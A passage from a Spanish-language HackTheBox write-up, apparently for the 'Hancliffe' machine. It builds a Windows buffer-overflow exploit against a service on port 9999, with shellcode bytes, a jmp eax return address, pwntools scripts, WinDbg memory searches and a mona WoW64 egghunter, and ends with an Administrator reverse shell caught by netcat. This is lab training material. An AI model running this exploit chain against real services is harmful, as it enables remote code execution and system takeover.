</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7d\x63\xb0\x48\x1c\xe7\xcb\x9c\xfe\xd6\x03</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd1\xff\x1f\x79\x18\xad\xc8\xf5\x8f\x41\x7c</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x43\x0c\xea\xce\x45\x14\x0f\x86\x64\x35\x9e</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x3e\x95\x21\x70\x4b\x9c\x39\x95\x76\x56</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb2\x6d\x0c\x69\x12\xbc\xed\xc6\x5b\x70\x1c</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x16\x9c\xb7\xff\x6d\xd4\xcb\x82\x75\x23\xb1</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\xf3\xb7\x11\x2a\xa3\x13\xa3\xff\x32\xd0</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xaf\xb4\x31\xbe\xb3\x4b\x95\xb5\xc8\xc0\x18</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x19\x59\x92\x3e\xbd\x01\x40\x5e\xe4\xef\x27</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xf6\x4f\x97\xc5\x7d\x7d\xcc\x77\xdc\xea</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\xba\xde\xea\x2d\xcd\xad\xd8\xf2\x65\x39</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x51\x7a\xa0\xbe\x96\x51\x14\x50\x69\x5a\x65</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x79\xae\x0e\x35\x11\x07\x2f\xde\xe1\xa8\xfa</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x71\xb1\x06\x55\x32\x61\xe7\x05\xda\x6b\xe8</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7a\xfa\x94\x22\x13\x91\x6f\xa5\x16\x6c\x61</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x4f\x72\x7d\x40\x34\xfb\x9b\x28\x5a\xaa</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x34\xc5\xc3\xf7\xce\x74\x0b\x22\xab\xb7\x87</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\x4c\x79\x60\xaf\x5e\xee\x80\xfa\x3c\xb9</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9f\xd0\x28\x25\x0d\xbf\xa8\x20\x2e\x68\xff</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x65\x80\x61\x95\x9b\xbb\xdb\x8b\x61\x5d\x23</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0f\xbe\x9e\xaa\x8e\x33\x9a\x88\x80\x8d\x23</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x95\xf4\x41\x72\x43\xa2\x27\x2c\x25\x1c\xfe</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x83\xef\xc8\x87\xef\x2f\x8e\x87\x25\xc6\x6e</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x39\x90\x9f\x91\xf6\x74\x28\xea\xea\xe4\xd7</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\xaf\x05\x3a\xe3\xda\xad\xe3\x66\x67\xb0</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x13\x5d\xa4\xcd\x97\x57\x55\x2a\x87\x12\x50</span><span class="s">"
</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x76\x0f\xcf\x28\xe7\xfa\xef\x9f\x08\x2f</span><span class="">"

</span><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> recv
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.11.115"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>

</span><span class="p">sleep(</span><span class="mi">1</span><span class="p">)
shell.sendline(shellcode)</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos el exploit a la maquina que corre el servicio en el puerto <code class="language-plaintext highlighter-rouge">9999</code> y recibimos una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la ultima flag de root</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.11.115 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.11.115 port 9999</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
hancliffe\administrator

C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
7cc**************************564

C:\Windows\system32></span>
</code></pre></div></div><br>

</section>

<section class="post" id="bof-egghunter">
<br><h3 class="post-title">Buffer Overflow - egghunter</h3><br>

<p class="plain-text">Volvemos al inicio del problema, la limitación de espacio, la pregunta que realmente debemos hacernos es si se guarda en algun otro lugar que no sea el stack, para ello enviaremos <code class="language-plaintext highlighter-rouge">w00tw00t</code> como marca para poder buscar el payload en la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 66</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez que el programa corrompe sabemos que solo se escriben <code class="language-plaintext highlighter-rouge">10</code> bytes en el stack pero si buscamos la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> en la memoria podemos encontrar una dirección que parece contener todas las <code class="language-plaintext highlighter-rouge">C's</code>, sin embargo también hay otras 2 direcciones que solo contienen <code class="language-plaintext highlighter-rouge">2</code> de las <code class="language-plaintext highlighter-rouge">C's</code> indicando el espacio de <code class="language-plaintext highlighter-rouge">10</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1c50.21b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00fcfed6 ebx=0000013c ecx=006e3b84 edx=00000000 esi=71901a3d edi=71901a3d  
eip=42424242 esp=00fcff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
42424242 ??              ???

</span><span class="ro">0:000></span><span class="p"> db esp
00fcff1c  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......
00fcff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
00fcff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
00fcff4c  73 79 61 68 12 00 00 00-90 3b 6e 00 28 3b 6e 00  syah.....;n.(;n.
00fcff5c  01 00 00 00 1d 00 00 00-3c 01 00 00 e0 36 6e 00  ........<....6n.
00fcff6c  00 00 00 00 00 00 00 00-84 ff fc 00 a9 7b 8a 77  .............{.w
00fcff7c  3c 01 00 00 90 7b 8a 77-dc ff fc 00 0b c1 a1 77  <....{.w.......w
00fcff8c  3c 01 00 00 f6 d5 2d ab-00 00 00 00 00 00 00 00  <.....-.........

</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
006e3726  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC
006e3b6e  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......
00fcff1c  77 30 30 74 77 30 30 74-43 43 ab ab ab ab ab ab  w00tw00tCC......</span>
</code></pre></div></div><br>

<p class="plain-text">Para evitar falsos positivos enviaremos <code class="language-plaintext highlighter-rouge">4</code> bytes extra antes, de esta forma en el stack se almacenan <code class="language-plaintext highlighter-rouge">4 C's</code> y solo tiene 6 bytes de espacio restante que solo alcanzan para la cadena <code class="language-plaintext highlighter-rouge">w00tw0</code> por lo que no coincidirá con la busqueda de la cadena completa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 66</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="p">  
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 100</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al ejecutar el exploit el programa corrompe y buscando la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> solo encontramos una coincidencia a diferencia de las 3 que habia antes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(2a34.2fa4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0117fed6 ebx=00000144 ecx=00d73b84 edx=00000000 esi=71901a3d edi=71901a3d  
eip=42424242 esp=0117ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
42424242 ??              ???

</span><span class="ro">0:000></span><span class="p"> db esp
0117ff1c  43 43 43 43 77 30 30 74-77 30 ab ab ab ab ab ab  CCCCw00tw0......
0117ff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
0117ff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
0117ff4c  73 79 61 68 12 00 00 00-90 3b d7 00 28 3b d7 00  syah.....;..(;..
0117ff5c  01 00 00 00 1d 00 00 00-44 01 00 00 e0 36 d7 00  ........D....6..
0117ff6c  00 00 00 00 00 00 00 00-84 ff 17 01 a9 7b 8a 77  .............{.w
0117ff7c  44 01 00 00 90 7b 8a 77-dc ff 17 01 0b c1 a1 77  D....{.w.......w
0117ff8c  44 01 00 00 03 f3 c2 29-00 00 00 00 00 00 00 00  D......)........

</span><span class="ro">0:000></span><span class="p"> s -a 0 L?80000000 w00tw00t
00d7372a  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD</span>
</code></pre></div></div><br>

<p class="plain-text">Esta dirección contiene todos los datos que enviamos, las <code class="language-plaintext highlighter-rouge">100 D's</code> se almacenan en la memoria, especificamente parece que en una región del segmento <code class="language-plaintext highlighter-rouge">heap</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> db 0x00d7372a
00d7372a  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD
00d7373a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00d7374a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00d7375a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00d7376a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00d7377a  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
00d7378a  44 44 44 44 44 44 44 44-44 44 44 44 0a 00 00 00  DDDDDDDDDDDD....
00d7379a  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

</span><span class="ro">0:000></span><span class="p"> !address 0x00d7372a

Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           00d70000
End Address:            00d75000
Region Size:            00005000 (  20.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00d70000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap -s -h 0xd70000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0xd7372a  

Content source: 1 (target), length: 18d6</span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente para evitar problemas o solaparnos con el stack en el poco espacio que nos queda haremos que este un poco mas arriba restandole <code class="language-plaintext highlighter-rouge">0x64</code> bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con mona creamos el <code class="language-plaintext highlighter-rouge">egghunter</code>, algo a tener en cuenta es que aunque el binario es <code class="language-plaintext highlighter-rouge">x86</code> la maquina victima es <code class="language-plaintext highlighter-rouge">x64</code> asi que tenemos que incluir un <code class="language-plaintext highlighter-rouge">-wow64</code></p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona egghunter -wow64
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py egghunter -wow64
[+] Egg set to w00t
[+] Generating egghunter for wow64, Windows 10
[+] Preparing output file 'egghunter.txt'
    - (Re)setting logfile C:\mona\egghunter.txt
[+] Egghunter  (51 bytes): 
"\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"  
"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05"  
"\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"  </span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">egghunter</code> lo que hara sera buscar en toda la memoria la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutar todo lo que esta despues que en este caso sera nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, el funcionamiento de este egghunter ya fue analizado en otro <a href="/exploit-development/windows-user/egghunters#wow64">post</a> sobre explotación</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Para el payload final enviaremos el <code class="language-plaintext highlighter-rouge">egghunter</code>, la basura y saltaremos a <code class="language-plaintext highlighter-rouge">eax</code> donde esta el egghunter, dejamos <code class="language-plaintext highlighter-rouge">4</code> bytes de espacio y despues enviamos el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> para que este se guarde en algun lugar de toda la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
payload </span><span class="o">+= </span><span class="p">shellcode</span>
</code></pre></div></div><br>

<p class="plain-text">Para verificar que funciona usaremos el shellcode para una calculadora antes creado y ejecutamos el exploit, como resultado abrimos una calculadora en el equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05</span><span class="s">"  
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  
</span><span class="p">
offset </span><span class="o">=</span><span class="mi"> 66</span><span class="p">
junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">-</span><span class="no"> len</span><span class="p">(egghunter))

shellcode</span><span class="o"> = </span><span class="no"> b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbf\x1c\x81\x88\x34\xda\xd6\xd9\x74\x24\xf4</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5d\x29\xc9\xb1\x31\x31\x7d\x13\x83\xed\xfc</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\x7d\x13\x63\x7d\xc8\xc3\xe1\x7e\x31\x13</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x86\xf7\xd4\x22\x86\x6c\x9c\x14\x36\xe6\xf0</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x98\xbd\xaa\xe0\x2b\xb3\x62\x06\x9c\x7e\x55</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x29\x1d\xd2\xa5\x28\x9d\x29\xfa\x8a\x9c\xe1</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0f\xca\xd9\x1c\xfd\x9e\xb2\x6b\x50\x0f\xb7</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x26\x69\xa4\x8b\xa7\xe9\x59\x5b\xc9\xd8\xcf</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x90\xfa\xee\x35\xa9\xb2\xe8\x5a\x94\x0d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x82\xa8\x62\x8c\x42\xe1\x8b\x23\xab\xce\x79</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3d\xeb\xe8\x61\x48\x05\x0b\x1f\x4b\xd2\x76</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xde\xc1\xd0\x88\x79\x2e\xe1\x5d\x1f\xa5</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xed\x2a\x6b\xe1\xf1\xad\xb8\x99\x0d\x25\x3f</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x84\x7d\x64\x4a\xcd\x26\x05\xcb\xab\x89</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3a\x0b\x14\x75\x9f\x47\xb8\x62\x92\x05\xd6</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x75\x20\x30\x94\x76\x3a\x3b\x88\x1e\x0b\xb0</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x47\x58\x94\x13\x2c\x96\xde\x3e\x04\x3f\x87</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xaa\x15\x22\x38\x01\x59\x5b\xbb\xa0\x21\x98</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\xc0\x24\xe4\x63\x38\x54\x75\x06\x3e\xcb</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x76\x03\x5d\x8a\xe4\xcf\x8c\x29\x8d\x6a\xd1</span><span class="s">"</span><span class="p">

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter </span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">4</span><span class="c1">        # padding</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"w00t"</span><span class="o"> *</span><span class="mi"> 2</span><span class="c1">     # egg</span><span class="p">
payload </span><span class="o">+= </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<a href="/hackthebox/hancliffe/29.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/29.png"></p></div></a>

<p class="plain-text">Este script tambien constara de 2 etapas, cuando el <code class="language-plaintext highlighter-rouge">egg</code> y el shellcode esten en algun lugar de la memoria ejecutara el <code class="language-plaintext highlighter-rouge">egghunter</code> que nos buscara el egg que es la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> y ejecutara todo lo que esta despues osea el <code class="language-plaintext highlighter-rouge">shellcode</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""
</span><span class="p">egghunter </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"sub esp, 0x64"</span><span class="p">)
</span><span class="p">egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53</span><span class="s">"  
